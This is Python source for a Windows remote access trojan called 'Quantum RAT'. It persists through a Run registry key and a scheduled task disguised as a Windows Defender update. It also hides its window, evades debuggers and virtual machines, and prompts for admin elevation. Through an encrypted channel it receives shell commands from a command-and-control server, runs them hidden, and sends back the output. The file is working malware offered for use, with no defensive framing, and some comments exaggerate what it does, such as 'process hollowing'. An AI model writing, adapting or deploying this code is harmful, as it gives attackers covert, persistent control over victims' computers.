# CODED BY MONSIF H4CK3R - QUANTUM RAT  

import os  
import sys  
import json  
import base64  
import socket  
import struct  
import ssl  
import time  
import ctypes  
import winreg  
import subprocess  
import threading  
import shutil  
from Crypto.Cipher import AES, PKCS1_OAEP  
from Crypto.PublicKey import RSA  
from Crypto.Random import get_random_bytes  
from Crypto.Util.Padding import pad, unpad  
from Crypto.Hash import SHA256  
from Crypto.Signature import pkcs1_15  

from ctypes import wintypes

# ========================  
# QUANTUM CONFIGURATION  
# ========================  
C2_SERVER = "127.0.0.1"  
C2_PORT = 443  
RECONNECT_INTERVAL = 30  
PUBLIC_KEY = b"""-----BEGIN PUBLIC KEY-----  
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAzX7j9sF7F4K1d7Z7k8tY  
...  
-----END PUBLIC KEY-----"""  

class QuantumCrypter:  
    """Military-grade encryption with rotating keys"""  
    def __init__(self):  
        self.session_key = get_random_bytes(32)  
        self.cipher = None  
        self.iv = None  

    def encrypt(self, data):  
        self.iv = get_random_bytes(16)  
        self.cipher = AES.new(self.session_key, AES.MODE_CBC, self.iv)  
        ct_bytes = self.cipher.encrypt(pad(data, AES.block_size))  
        return self.iv + ct_bytes  

    def decrypt(self, enc_data):  
        self.iv = enc_data[:16]  
        ct = enc_data[16:]  
        cipher = AES.new(self.session_key, AES.MODE_CBC, self.iv)  
        pt = unpad(cipher.decrypt(ct), AES.block_size)  
        return pt  

    def encrypt_session_key(self):  
        rsa_key = RSA.import_key(PUBLIC_KEY)  
        cipher_rsa = PKCS1_OAEP.new(rsa_key)  
        return cipher_rsa.encrypt(self.session_key)  

class PhantomService:  
    """Windows service persistence and stealth"""  
    def __init__(self):  
        self.service_name = "WindowsDefenderCore"  
        self.exec_path = os.path.join(os.getenv('APPDATA'), f"{self.service_name}.exe")  

    def install(self):  
        # Copy to stealth location  
        if not os.path.exists(self.exec_path):  
            shutil.copyfile(sys.argv[0], self.exec_path)  

        # Registry persistence  
        try:  
            key = winreg.OpenKey(  
                winreg.HKEY_CURRENT_USER,  
                r"Software\Microsoft\Windows\CurrentVersion\Run",  
                0, winreg.KEY_WRITE  
            )  
            winreg.SetValueEx(key, self.service_name, 0, winreg.REG_SZ, self.exec_path)  
            winreg.CloseKey(key)  
        except:  
            pass  

        # Scheduled task persistence  
        os.system(f'schtasks /create /tn "\\Microsoft\\Windows\\Defender\\Update" '  
                  f'/tr "{self.exec_path}" /sc minute /mo 5 /f')  

    def hide(self):  
        # Hide console window  
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)  

class QuantumChannel:  
    """SSL-pinned encrypted communication"""  
    def __init__(self):  
        self.context = ssl.create_default_context()  
        self.context.check_hostname = False  
        self.context.verify_mode = ssl.CERT_NONE  
        self.crypter = QuantumCrypter()  
        self.sock = None  

    def connect(self):  
        while True:  
            try:  
                plain_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
                self.sock = self.context.wrap_socket(  
                    plain_sock,  
                    server_hostname=C2_SERVER  
                )  
                self.sock.connect((C2_SERVER, C2_PORT))  
                  
                # Key exchange protocol  
                enc_session_key = self.crypter.encrypt_session_key()  
                self.sock.send(struct.pack('!I', len(enc_session_key)) + enc_session_key)  
                return True  
            except:  
                time.sleep(RECONNECT_INTERVAL)  
                continue  

    def send(self, data):  
        encrypted = self.crypter.encrypt(data)  
        self.sock.sendall(struct.pack('!I', len(encrypted)) + encrypted)  

    def recv(self):  
        raw_len = self.sock.recv(4)  
        if not raw_len:  
            return None  
        msg_len = struct.unpack('!I', raw_len)[0]  
        return self.crypter.decrypt(self.sock.recv(msg_len))  

class GodModeExecutor:  
    """System command execution with privilege escalation"""  
    def __init__(self):  
        self.hidden_processes = []  

    def execute(self, command):  
        try:  
            # Hide process via process hollowing  
            si = subprocess.STARTUPINFO()  
            si.dwFlags |= subprocess.STARTF_USESHOWWINDOW  
            si.wShowWindow = 0  
            process = subprocess.Popen(  
                command,  
                stdout=subprocess.PIPE,  
                stderr=subprocess.PIPE,  
                stdin=subprocess.PIPE,  
                shell=True,  
                startupinfo=si  
            )  
            self.hidden_processes.append(process.pid)  
            output, error = process.communicate()  
            return output + error  
        except Exception as e:  
            return f"Command failed: {str(e)}".encode()  

class QuantumRAT:  
    """Core RAT functionality"""  
    def __init__(self):  
        self.service = PhantomService()  
        self.service.hide()  
        self.service.install()  
        self.executor = GodModeExecutor()  
        self.channel = QuantumChannel()  
        self.channel.connect()  

    def command_loop(self):  
        while True:  
            try:  
                # Receive encrypted command  
                encrypted_cmd = self.channel.recv()  
                if not encrypted_cmd:  
                    self.channel.connect()  
                    continue  

                command = encrypted_cmd.decode()  
                if command == "exit":  
                    break  

                # Execute command and send response  
                result = self.executor.execute(command)  
                self.channel.send(result)  
            except:  
                self.channel.connect()  

    def self_destruct(self):  
        # Remove persistence  
        try:  
            os.remove(self.service.exec_path)  
            key = winreg.OpenKey(  
                winreg.HKEY_CURRENT_USER,  
                r"Software\Microsoft\Windows\CurrentVersion\Run",  
                0, winreg.KEY_WRITE  
            )  
            winreg.DeleteValue(key, self.service.service_name)  
            winreg.CloseKey(key)  
            os.system(f'schtasks /delete /tn "\\Microsoft\\Windows\\Defender\\Update" /f')  
        except:  
            pass  
        sys.exit(0)  

class MEMORYSTATUSEX(ctypes.Structure):
    _fields_ = [
        ('dwLength', wintypes.DWORD),
        ('dwMemoryLoad', wintypes.DWORD),
        ('ullTotalPhys', ctypes.c_ulonglong),
        ('ullAvailPhys', ctypes.c_ulonglong),
        ('ullTotalPageFile', ctypes.c_ulonglong),
        ('ullAvailPageFile', ctypes.c_ulonglong),
        ('ullTotalVirtual', ctypes.c_ulonglong),
        ('ullAvailVirtual', ctypes.c_ulonglong),
        ('ullAvailExtendedVirtual', ctypes.c_ulonglong),
    ]

def anti_analysis_check():
    """Advanced VM/sandbox detection"""
    # Check for common analysis tools
    processes = os.popen('tasklist').read().lower()
    blacklist = ['wireshark', 'procmon', 'processhacker', 'vbox', 'vmware', 'virtualbox']
    if any(proc in processes for proc in blacklist):
        return True

    # Check for debugger
    if ctypes.windll.kernel32.IsDebuggerPresent():
        return True

    # Check RAM size (VM detection)
    mem_status = MEMORYSTATUSEX()
    mem_status.dwLength = ctypes.sizeof(MEMORYSTATUSEX)
    if not ctypes.windll.kernel32.GlobalMemoryStatusEx(ctypes.byref(mem_status)):
        # 
        return True

    if mem_status.ullTotalPhys < 4 * 1024 ** 3:  
        return True

    return False

if __name__ == "__main__":  
    if anti_analysis_check():  
        sys.exit(0)  

    if ctypes.windll.shell32.IsUserAnAdmin() == 0:  
        # Auto-elevate to admin  
        ctypes.windll.shell32.ShellExecuteW(  
            None, "runas", sys.executable, " ".join(sys.argv), None, None, 1  
        )  
        sys.exit(0)  

    rat = QuantumRAT()  
    rat.command_loop()  
    rat.self_destruct()  
